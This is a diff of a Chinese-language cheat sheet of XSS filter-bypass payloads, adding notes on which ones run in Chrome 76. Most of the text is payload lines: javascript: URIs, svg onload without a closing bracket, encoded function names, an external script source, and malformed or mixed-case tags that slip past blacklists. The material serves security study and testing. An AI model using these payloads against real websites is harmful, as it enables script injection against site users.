@@ -205,11 +205,14 @@ document.getElementById("c").innerHTML="<img src=@ onerror=alert(3) />";
   * [MyPapers/Bypassing-XSS-detection-mechanisms](https://github.com/s0md3v/MyPapers/tree/master/Bypassing-XSS-detection-mechanisms)
 
 
-注意:以下这些Payload都没有用到single quotes(') 或 double quotes (").
+* 注意:以下这些Payload
+  * 大多数在Chrome 76.0.3809.132下测试成功，无法执行的已标注
+  * 都没有用到single quotes(') 或 double quotes (")
 
 - Without event handlers - 不用事件处理
 ```
 # 用object标签的data属性 属性值为javascript:
+# 这个payload在Chrome 76.0.3809.132下无法执行
 <object data=javascript:confirm()>
 
 # 用a标签的href属性 属性值为javascript:
@@ -238,6 +241,7 @@ document.getElementById("c").innerHTML="<img src=@ onerror=alert(3) />";
 ```
 
 - Without equal sign (=) - 不使用等号`=`
+
 ```
 # 直接 函数名
 <script>confirm()</script>
@@ -245,16 +249,18 @@ document.getElementById("c").innerHTML="<img src=@ onerror=alert(3) />";
 
 - Without closing angular bracket (>) - 不使用右尖括号`>`结束标签
 ```
-# 使用//结束标签
+# 使用//可以结束svg标签 需//之后有任意标签<x> 则svg标签中的JavaScript就能成功执行
 <svg onload=confirm()//
 ```
 
-- Without alert, confirm, prompt - 不使用alert, confirm, prompt函数
+- 使用编码 "变形" 不出现字符串 `alert` `confirm` `prompt`
 
 ```
 # <script src=外部js文件
 <script src=//14.rs></script>
+```
 
+```
 # svg标签 - 编码 \u编码
 <svg onload=co\u006efirm()>
 
@@ -263,7 +269,7 @@ document.getElementById("c").innerHTML="<img src=@ onerror=alert(3) />";
 ```
 
 ```
-# svg标签 - html实体编码 chrome下测试成功
+# svg标签 - 编码 html实体编码
 
 例1
 
@@ -298,16 +304,16 @@ document.getElementById("c").innerHTML="<img src=@ onerror=alert(3) />";
 
 - Bypass tag blacklisting - 绕过HTML标签黑名单
 ```
-# 大小写
+# 绕过不严谨的判断 - 大小写
 </ScRipT>
 
-# 利用兼容性 - 畸形标签 缺少>
+# 利用浏览器兼容性 - 畸形标签 删除最后的符号>
 </script
 
-# 利用兼容性 - 畸形标签 用/>替换>
+# 利用浏览器兼容性 - 畸形标签 用/>替换符号>
 </script/>
 
-# 利用兼容性 - 畸形标签
+# 利用浏览器兼容性 - 畸形标签
 </script x>
 ```
 
